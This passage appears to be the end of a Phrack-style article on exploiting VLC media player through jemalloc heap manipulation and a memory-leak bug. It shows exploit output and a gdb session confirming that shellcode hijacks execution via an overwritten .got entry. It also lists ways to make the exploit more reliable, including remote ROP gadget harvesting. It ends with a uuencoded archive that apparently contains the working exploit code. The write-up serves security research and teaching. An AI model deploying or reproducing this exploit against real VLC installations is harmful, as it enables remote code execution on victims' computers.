+0x28b334c0...0x28b33500...0x28b33540...0x28b33580...0x28b335c0...
+0x28b33600...0x28b33640...0x28b33680...0x28b336c0...0x28b33700...
+0x28b33740...0x28b33780...0x28b337c0...0x28b33800...0x28b33840...
+0x28b33880...0x28b338c0...0x28b33900...0x28b33940...0x28b33980...
+0x28b339c0...0x28b33a00...0x28b33a40...0x28b33a80...0x28b33ac0...
+0x28b33b00...0x28b33b40...0x28b33b80...0x28b33bc0...0x28b33c00...
+0x28b33c40...0x28b33c80...0x28b33cc0...0x28b33d00...0x28b33d40...
+0x28b33d80...0x28b33dc0...0x28b33e00...0x28b33e40...0x28b33e80...
+0x28b33ec0...0x28b33f00...0x28b33f40...0x28b33f80...0x28b33fc0...
+0x28b34080...0x28b340c0...0x28b34100...0x28b34140...0x28b34180...
+0x28b341c0...0x28b34200...0x28b34240...0x28b34280...0x28b342c0...
+0x28b34300...0x28b34340...0x28b34380...0x28b343c0...0x28b34400...
+0x28b34440...0x28b34480...0x28b344c0...0x28b34500...0x28b34540...
+0x28b34580...0x28b345c0...0x28b34600...0x28b34640...0x28b34680...
+0x28b346c0...0x28b34700...0x28b34740...0x28b34780...0x28b347c0...
+0x28b34800...0x28b34840...0x28b34880...0x28b348c0...0x28b34900...
+0x28b34940...0x28b34980...0x28b349c0...0x28b34a00...0x28b34a40...
+0x28b34a80...0x28b34ac0...0x28b34b00...0x28b34b40...0x28b34b80...
+0x28b34bc0...0x28b34c00...0x28b34c40...0x28b34c80...0x28b34cc0...
+0x28b34d00...0x28b34d40...0x28b34d80...0x28b34dc0...0x28b34e00...
+0x28b34e40...0x28b34e80...0x28b34ec0...0x28b34f00...0x28b34f40...
+0x28b34f80...0x28b34fc0...0x28b36080...0x28b360c0...0x28b36100...
+0x28b36140...0x28b36180...0x28b361c0...0x28b36200...0x28b36240...
+0x28b36280...0x28b362c0...0x28b36300...0x28b36340...0x28b36380...
+0x28b363c0...0x28b36400...0x28b36440...0x28b36480...0x28b364c0...
+0x28b36500...0x28b36540...0x28b36580...0x28b365c0...0x28b36600...
+0x28b36640...0x28b36680...0x28b366c0...0x28b36700...0x28b36740...
+0x28b36780...0x28b367c0...0x28b36800...0x28b36840...0x28b36880...
+0x28b368c0...0x28b36900...0x28b36940...0x28b36980...0x28b369c0...
+0x28b36a00...0x28b36a40...0x28b36a80...0x28b36ac0...0x28b36b00...
+0x28b36b40...0x28b36b80...0x28b36bc0...0x28b36c00...0x28b36c40...
+0x28b36c80...0x28b36cc0...0x28b36d00...0x28b36d40...0x28b36d80...
+0x28b36dc0...0x28b36e00...0x28b36e40...0x28b36e80...0x28b36ec0...
+0x28b36f00...0x28b36f40...0x28b36f80...0x28b36fc0...0x28b37080...
+0x28b370c0...0x28b37100...0x28b37140...0x28b37180...0x28b371c0...
+0x28b37200...0x28b37240...0x28b37280...0x28b372c0...0x28b37300...
+0x28b37340...0x28b37380...0x28b373c0...0x28b37400...0x28b37440...
+0x28b37480...0x28b374c0...0x28b37500...0x28b37540...0x28b37580...
+0x28b375c0...0x28b37600...0x28b37640...0x28b37680...0x28b376c0...
+0x28b37700...0x28b37740...0x28b37780...0x28b377c0...0x28b37800...
+0x28b37840...0x28b37880...0x28b378c0...0x28b37900...0x28b37940...
+0x28b37980...0x28b379c0...0x28b37a00...0x28b37a40...0x28b37a80...
+0x28b37ac0...0x28b37b00...0x28b37b40...0x28b37b80...0x28b37bc0...
+0x28b37c00...0x28b37c40...0x28b37c80...0x28b37cc0...0x28b37d00...
+0x28b37d40...0x28b37d80...0x28b37dc0...0x28b37e00...0x28b37e40...
+0x28b37e80...0x28b37ec0...0x28b37f00...0x28b37f40...0x28b37f80...
+0x28b37fc0...0x28b38080...0x28b380c0...0x28b38100...0x28b38140...
+0x28b38180...0x28b381c0...0x28b38200...0x28b38240...0x28b38280...
+0x28b382c0...0x28b38300...0x28b38340...0x28b38380...0x28b383c0...
+0x28b38400...0x28b38440...0x28b38480...0x28b384c0...0x28b38500...
+0x28b38540...0x28b38580...0x28b385c0...0x28b38600...0x28b38640...
+0x28b38680...0x28b386c0...0x28b38700...0x28b38740...0x28b38780...
+0x28b387c0...0x28b38800...0x28b38840...0x28b38880...0x28b388c0...
+0x28b38900...0x28b38940...0x28b38980...0x28b389c0...0x28b38a00...
+0x28b38a40...0x28b38a80...0x28b38ac0...0x28b38b00...0x28b38b40...
+0x28b38b80...0x28b38bc0...0x28b38c00...0x28b38c40...0x28b38c80...
+0x28b38cc0...0x28b38d00...0x28b38d40...0x28b38d80...0x28b38dc0...
+0x28b38e00...0x28b38e40...0x28b38e80...0x28b38ec0...0x28b38f00...
+0x28b38f40...0x28b38f80...0x28b38fc0...0x28b39080...0x28b390c0...
+0x28b39100...0x28b39140...0x28b39180...0x28b391c0...0x28b39200...
+0x28b39240...0x28b39280...0x28b392c0...0x28b39300...0x28b39340...
+0x28b39380...0x28b393c0...0x28b39400...0x28b39440...0x28b39480...
+0x28b394c0...0x28b39500...0x28b39540...0x28b39580...0x28b395c0...
+0x28b39600...0x28b39640...0x28b39680...0x28b396c0...0x28b39700...
+0x28b39740...0x28b39780...0x28b397c0...0x28b39800...0x28b39840...
+0x28b39880...0x28b398c0...0x28b39900...0x28b39940...0x28b39980...
+0x28b399c0...0x28b39a00...0x28b39a40...0x28b39a80...0x28b39ac0...
+0x28b39b00...0x28b39b40...0x28b39b80...0x28b39bc0...0x28b39c00...
+0x28b39c40...0x28b39c80...0x28b39cc0...0x28b39d00...0x28b39d40...
+0x28b39d80...0x28b39dc0...0x28b39e00...0x28b39e40...0x28b39e80...
+0x28b39ec0...0x28b39f00...0x28b39f40...0x28b39f80...0x28b39fc0...
+0x28b3a080...0x28b3a0c0...0x28b3a100...0x28b3a140...0x28b3a180...
+0x28b3a1c0...0x28b3a200...0x28b3a240...0x28b3a280...0x28b3a2c0...
+0x28b3a300...0x28b3a340...0x28b3a380...0x28b3a3c0...0x28b3a400...
+0x28b3a440...0x28b3a480...0x28b3a4c0...0x28b3a500...0x28b3a540...
+0x28b3a580...0x28b3a5c0...0x28b3a600...0x28b3a640...0x28b3a680...
+0x28b3a6c0...0x28b3a700...0x28b3a740...0x28b3a780...0x28b3a7c0...
+0x28b3a800...0x28b3a840...0x28b3a880...0x28b3a8c0...0x28b3a900...
+0x28b3a940...0x28b3a980...0x28b3a9c0...0x28b3aa00...0x28b3aa40...
+0x28b3aa80...0x28b3aac0...0x28b3ab00...0x28b3ab40...0x28b3ab80...
+0x28b3abc0...0x28b3ac00...0x28b3ac40...0x28b3ac80...0x28b3acc0...
+0x28b3ad00...0x28b3ad40...0x28b3ad80...0x28b3adc0...0x28b3ae00...
+0x28b3ae40...0x28b3ae80...0x28b3aec0...0x28b3af00...0x28b3af40...
+0x28b3af80...0x28b3afc0...0x28b3b080...0x28b3b0c0...0x28b3b100...
+0x28b3b140...0x28b3b180...0x28b3b1c0...0x28b3b200...0x28b3b240...
+0x28b3b280...0x28b3b2c0...0x28b3b300...0x28b3b340...0x28b3b380...
+0x28b3b3c0...0x28b3b400...0x28b3b440...0x28b3b480...0x28b3b4c0...
+0x28b3b500...0x28b3b540...0x28b3b580...0x28b3b5c0...0x28b3b600...
+0x28b3b640...0x28b3b680...0x28b3b6c0...0x28b3b700...0x28b3b740...
+0x28b3b780...0x28b3b7c0...0x28b3b800...0x28b3b840...0x28b3b880...
+0x28b3b8c0...0x28b3b900...0x28b3b940...0x28b3b980...0x28b3b9c0...
+0x28b3ba00...0x28b3ba40...0x28b3ba80...0x28b3bac0...0x28b3bb00...
+0x28b3bb40...0x28b3bb80...0x28b3bbc0...0x28b3bc00...0x28b3bc40...
+0x28b3bc80...0x28b3bcc0...0x28b3bd00...0x28b3bd40...0x28b3bd80...
+0x28b3bdc0...0x28b3be00...0x28b3be40...0x28b3be80...0x28b3bec0...
+0x28b3bf00...0x28b3bf40...0x28b3bf80...0x28b3bfc0...0x28bac080...
+0x28bac0c0...0x28bac100...0x28bac140...0x28bac180...0x28bac1c0...
+0x28bac200...0x28bac240...0x28bac280...0x28bac2c0...0x28bac300...
+0x28bac340...0x28bac380...0x28bac3c0...0x28bac400...0x28bac440...
+0x28bac480...0x28bac4c0...0x28bac500...0x28bac540...0x28bac580...
+0x28bac5c0...0x28bac600...0x28bac640...0x28bac680...0x28bac6c0...
+0x28bac700...0x28bac740...0x28bac780...0x28bac7c0...0x28bac800...
+0x28bac840...0x28bac880...0x28bac8c0...0x28bac900...0x28bac940...
+0x28bac980...0x28bac9c0...0x28baca00...0x28baca40...0x28baca80...
+0x28bacac0...0x28bacb00...0x28bacb40...0x28bacb80...0x28bacbc0...
+0x28bacc00...0x28bacc40...0x28bacc80...0x28baccc0...0x28bacd00...
+0x28bacd40...0x28bacd80...0x28bacdc0...0x28bace00...0x28bace40...
+0x28bace80...0x28bacec0...0x28bacf00...0x28bacf40...0x28bacf80...
+0x28bacfc0...0x28bad080...0x28bad0c0...0x28bad100...0x28bad140...
+0x28bad180...0x28bad1c0...0x28bad200...0x28bad240...0x28bad280...
+0x28bad2c0...0x28bad300...0x28bad340...0x28bad380...0x28bad3c0...
+0x28bad400...0x28bad440...0x28bad480...0x28bad4c0...0x28bad500...
+0x28bad540...0x28bad580...0x28bad5c0...0x28bad600...0x28bad640...
+0x28bad680...0x28bad6c0...0x28bad700...0x28bad740...0x28bad780...
+0x28bad7c0...0x28bad800...0x28bad840...0x28bad880...0x28bad8c0...
+0x28bad900...0x28bad940...0x28bad980...0x28bad9c0...0x28bada00...
+0x28bada40...0x28bada80...0x28badac0...0x28badb00...0x28badb40...
+0x28badb80...0x28badbc0...0x28badc00...0x28badc40...0x28badc80...
+0x28badcc0...0x28badd00...0x28badd40...0x28badd80...0x28baddc0...
+0x28bade00...0x28bade40...0x28bade80...0x28badec0...0x28badf00...
+0x28badf40...0x28badf80...0x28badfc0...0x28bae080...0x28bae0c0...
+0x28bae100...0x28bae140...0x28bae180...0x28bae1c0...0x28bae200...
+0x28bae240...0x28bae280...0x28bae2c0...0x28bae300...0x28bae340...
+0x28bae380...0x28bae3c0...0x28bae400...0x28bae440...0x28bae480...
+0x28bae4c0...0x28bae500...0x28bae540...0x28bae580...0x28bae5c0...
+0x28bae600...0x28bae640...0x28bae680...0x28bae6c0...0x28bae700...
+0x28bae740...0x28bae780...0x28bae7c0...0x28bae800...0x28bae840...
+0x28bae880...0x28bae8c0...0x28bae900...0x28bae940...0x28bae980...
+0x28bae9c0...0x28baea00...0x28baea40...0x28baea80...0x28baeac0...
+0x28baeb00...0x28baeb40...0x28baeb80...0x28baebc0...0x28baec00...
+0x28baec40...0x28baec80...0x28baecc0...0x28baed00...0x28baed40...
+0x28baed80...0x28baedc0...0x28baee00...0x28baee40...0x28baee80...
+0x28baeec0...0x28baef00...0x28baef40...0x28baef80...0x28baefc0...
+0x28baf080...0x28baf0c0...0x28baf100...0x28baf140...0x28baf180...
+0x28baf1c0...0x28baf200...0x28baf240...0x28baf280...0x28baf2c0...
+0x28baf300...0x28baf340...0x28baf380...0x28baf3c0...0x28baf400...
+0x28baf440...0x28baf480...0x28baf4c0...0x28baf500...0x28baf540...
+0x28baf580...0x28baf5c0...0x28baf600...0x28baf640...0x28baf680...
+0x28baf6c0...0x28baf700...0x28baf740...0x28baf780...0x28baf7c0...
+0x28baf800...0x28baf840...0x28baf880...0x28baf8c0...0x28baf900...
+0x28baf940...0x28baf980...0x28baf9c0...0x28bafa00...0x28bafa40...
+0x28bafa80...0x28bafac0...0x28bafb00...0x28bafb40...0x28bafb80...
+0x28bafbc0...0x28bafc00...0x28bafc40...0x28bafc80...0x28bafcc0...
+0x28bafd00...0x28bafd40...0x28bafd80...0x28bafdc0...0x28bafe00...
+0x28bafe40...0x28bafe80...0x28bafec0...0x28baff00...0x28baff40...
+0x28baff80...0x28baffc0...ok
+[~] Forcing shellcode execution
+[~] Playing MP4 file 1 times
+.ok
+[~] Done
+
+
+The console on the other side looks like the following:
+
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x28919b01 in ?? ()
+
+
+The exploit output informs us that the .got entry for memset() lies
+at 0x284edea8. Let's verify...
+
+
+(gdb) x/4bx 0x284edea8
+0x284edea8:     0x00    0x9b    0x91    0x28
+(gdb) x/i 0x28919b00
+   0x28919b00:  int3
+
+
+Obviously, it has been overwritten with the pointer to our ASM
+instructions. The 'SIGTRAP' informs us that EIP landed on top of them.
+
+
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 2078] will be killed.
+
+Quit anyway? (y or n) y
+
+
+If you decide no to use gdb (that's what real men do), the following
+message will pop up upon successful exploitation.
+
+
+Trace/BPT trap: 5 (core dumped)
+
+
+--[ 7 - Limitations
+
+As we promised, we will give a list of the factors that limit our
+exploit's reliability. People interested in improving our code should
+first have a look below.
+
+1 - Back in the section we analyzed the RMF vulnerability, we said that
+the memory range we want leaked, is trashed with 'i_frame_size' bytes;
+in our exploit code we use a frame size of 20, so, 20 bytes end up being
+written at the target address. Apparently, because of this trashing of the
+target memory, we cannot leak .text or any other read only mapping from
+the target application, since attempting to write on it will terminate
+VLC with a segmentation violation. Quick tests show that we cannot somehow
+set 'i_frame_size' to 0 so that 'memcpy()' becomes a nop. Nevertheless,
+the interested reader is advised to analyze this further and find a way
+to bypass this limitation.
+
+  Note: Recall the RMF vulnerability; a function pointer overwrite is
+  possible. Managing to leak .text addresses means you can do automated
+  remote ROP gadget harvesting in order to write a reliable exploit ;)
+
+2 - For some reason we are not aware of, requesting a memory leak of
+more than 8MB returns no data at all. Maybe this is related to the output
+filters splitting the 'p_blocks' in smaller parts, or maybe not ;p This
+is a very important limitation, since smaller leaked data chunks means
+more requests for leaked memory which in turn implies more memory being
+trashed. Consequently, more data we shouldn't touch may be modified
+resulting in an unexpected crash of VLC.
+
+3 - Unfortunately, there's at least one logical bug within VLC;
+a logical bug related to input buffering and the clients receiving
+network streams. When we have some free time we may report it to the VLC
+developers :p More logical bugs that confine the exploitation process'
+reliability may be present. A reliable one shot exploit requires a
+harder study of VLC's source code (yeah, as if we have nothing better
+to deal with).
+
+4 - The exploit assumes that 64-byte regions usually lie between 0x28700000
+and 0x28e00000 and tries to locate them. Some times the heap extends
+beyond that range. We have to find a way to figure this out, get the
+topmost heap address and explore the whole region. Doing that in a
+reliable way requires problem 2 to be solved first.
+
+5 - In section 5.2 we analyzed how the 'p_root' candidates are located. The
+process described in the aforementioned section takes into account only the
+bins of the first arena, but VLC, being a multithreaded application,
+initializes more than one. We believe it's possible to detect those extra
+arenas, locate their bin-64 addresses and take them into account as well.
+Alternatively, one may leak and analyze the TLS data of each thread thus
+locating their magazine racks, their magazines and the 'rounds[]' array
+corresponding to 64-byte regions.
+
+6 - In step 6 of section 5.2 we said that all regions of the detected runs
+will eventually be freed by our special MP4 file in hope that 'p_root' will
+lie somewhere within them. Although we do our best to fill heap holes, this
+process may result in a segmentation fault due to the fact that regions
+already freed are freed for a second time. It is possible to avoid this by
+having a look at the target runs' region bitmap and freeing only those
+regions that seem to be allocated. We didn't have the time to implement
+this but we believe it's trivial (take a look at the comments in the 
+exploit's 'main.py').
+
+If you manage to solve any of these problems, please let us know; don't
+be a greedy pussy ;)
+
+
+--[ 8 - Final words
+
+Exploit development is definitely a hard task; Do you think that the money
+offered by [censored] is worth the trouble?
+
+In this article, which is short compared to our efforts during the exploit
+development, we tried to give as much detail as possible. Unfortunately
+there's no way for us to present every minor detail; a deeper look into
+VLC's source code is required. All that jemalloc stuff was fun but
+tiresome. We think it's about time we take some time off :) We would like
+to thank the Phrack staff for being the Phrack staff, our grhack.net
+colleagues and all our friends that still keep it real. Our work is
+dedicated to all those 'producers' of the security ecosystem that keep
+their mouth shut and put their brains to work. Love, peace and lots of #.
+
+
+--[ 9 - References
+
+[1] vl4d1m1r of ac1db1tch3z, The art of exploitation: Autopsy of cvsxpl
+    http://www.phrack.org/issues.html?issue=64&id=15&mode=txt
+
+[2] Feline Menace, Technical analysis of Samba WINS stack overflow
+    http://www.phrack.org/issues.html?issue=65&id=12&mode=txt
+
+[3] GOBBLES, Local/remote mpg123 exploit
+    http://www.securityfocus.com/archive/1/306476
+
+[4] VLC Security Advisory 1103
+    http://www.videolan.org/security/sa1103.html
+
+[5] Chapter 4. Examples for advanced use of VLC's stream output
+    (transcoding, multiple streaming, etc...)
+    http://www.videolan.org/doc/streaming-howto/en/ch04.html
+
+[6] VLC Security Advisory 1105
+    http://www.videolan.org/security/sa1105.html
+
+[7] RealAudio
+    http://en.wikipedia.org/wiki/RealAudio
+
+[8] RealAudio sipr
+    http://wiki.multimedia.cx/index.php?title=RealAudio_sipr
+
+
+--[ 10 - T3h l337 c0d3z
+
+begin 644 vlc_lulz_v0.1.tar.gz
+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
